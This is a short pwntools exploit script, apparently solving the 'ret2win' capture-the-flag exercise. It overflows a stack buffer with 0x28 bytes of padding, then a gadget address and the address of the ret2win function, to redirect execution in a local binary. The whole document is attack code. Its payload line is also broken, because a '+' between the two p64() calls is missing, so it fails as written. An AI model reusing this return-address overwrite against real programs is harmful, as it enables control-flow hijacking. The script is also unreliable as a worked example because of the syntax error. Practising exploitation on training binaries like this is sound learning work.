from pwn import *
elf = ELF('./ret2win')
p = process(elf.path)
payload = b'a'*0x28 +p64(0x40053e) p64(elf.symbols['ret2win'])
p.sendline(payload)
response= p.recvall()
print(response.decode())

